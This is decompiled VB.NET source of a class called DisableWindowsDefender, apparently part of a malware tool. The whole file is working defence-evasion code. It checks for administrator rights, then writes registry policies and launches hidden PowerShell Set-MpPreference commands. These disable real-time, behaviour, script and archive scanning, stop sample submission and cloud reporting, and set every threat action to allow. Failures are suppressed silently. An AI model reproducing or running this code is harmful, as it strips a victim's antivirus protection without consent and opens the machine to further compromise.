Imports System
Imports System.Diagnostics
Imports System.Security.Principal
Imports Microsoft.Win32

Namespace Main.Tools
	' Token: 0x02000031 RID: 49
	Friend Class DisableWindowsDefender
		' Token: 0x0600011C RID: 284 RVA: 0x0000ABC0 File Offset: 0x00008DC0
		Public Shared Sub StopAv()
			Try
				If New WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) Then
					DisableWindowsDefender.RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1")
					DisableWindowsDefender.RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1")
					DisableWindowsDefender.RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1")
					DisableWindowsDefender.RegistryEdit("SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1")
					DisableWindowsDefender.CheckDefender()
				End If
			Catch
			End Try
		End Sub

		' Token: 0x0600011D RID: 285 RVA: 0x0000AC54 File Offset: 0x00008E54
		Private Shared Sub RegistryEdit(regPath As String, name As String, value As String)
			Using registryKey As RegistryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree)
				If registryKey Is Nothing Then
					Dim registryKey2 As RegistryKey = Registry.LocalMachine.CreateSubKey(regPath)
					If registryKey2 IsNot Nothing Then
						registryKey2.SetValue(name, value, RegistryValueKind.DWord)
					End If
				ElseIf registryKey.GetValue(name).ToString() <> value Then
					registryKey.SetValue(name, value, RegistryValueKind.DWord)
				End If
			End Using
		End Sub

		' Token: 0x0600011E RID: 286 RVA: 0x0000ACC8 File Offset: 0x00008EC8
		Private Shared Sub CheckDefender()
			Dim process As Process = New Process() With { .StartInfo = New ProcessStartInfo() With { .FileName = "powershell", .Arguments = "Get-MpPreference -verbose", .UseShellExecute = False, .RedirectStandardOutput = True, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True } }
			process.Start()
			While Not process.StandardOutput.EndOfStream
				Dim text As String = process.StandardOutput.ReadLine()
				If text.Contains("DisableRealtimeMonitoring") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableRealtimeMonitoring $true")
				ElseIf text.Contains("DisableBehaviorMonitoring") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableBehaviorMonitoring $true")
				ElseIf text.Contains("DisableBlockAtFirstSeen") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true")
				ElseIf text.Contains("DisableIOAVProtection") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableIOAVProtection $true")
				ElseIf text.Contains("DisablePrivacyMode") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisablePrivacyMode $true")
				ElseIf text.Contains("SignatureDisableUpdateOnStartupWithoutEngine") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true")
				ElseIf text.Contains("DisableArchiveScanning") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableArchiveScanning $true")
				ElseIf text.Contains("DisableIntrusionPreventionSystem") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true")
				ElseIf text.Contains("DisableScriptScanning") AndAlso text.Contains("False") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -DisableScriptScanning $true")
				ElseIf text.Contains("SubmitSamplesConsent") AndAlso Not text.Contains("2") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -SubmitSamplesConsent 2")
				ElseIf text.Contains("MAPSReporting") AndAlso Not text.Contains("0") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -MAPSReporting 0")
				ElseIf text.Contains("HighThreatDefaultAction") AndAlso Not text.Contains("6") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force")
				ElseIf text.Contains("ModerateThreatDefaultAction") AndAlso Not text.Contains("6") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -ModerateThreatDefaultAction 6")
				ElseIf text.Contains("LowThreatDefaultAction") AndAlso Not text.Contains("6") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -LowThreatDefaultAction 6")
				ElseIf text.Contains("SevereThreatDefaultAction") AndAlso Not text.Contains("6") Then
					DisableWindowsDefender.RunPS("Set-MpPreference -SevereThreatDefaultAction 6")
				End If
			End While
		End Sub

		' Token: 0x0600011F RID: 287 RVA: 0x0000AFE0 File Offset: 0x000091E0
		Private Shared Sub RunPS(args As String)
			Dim process As Process = New Process() With { .StartInfo = New ProcessStartInfo() With { .FileName = "powershell", .Arguments = args, .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True } }
			process.Start()
		End Sub
	End Class
End Namespace
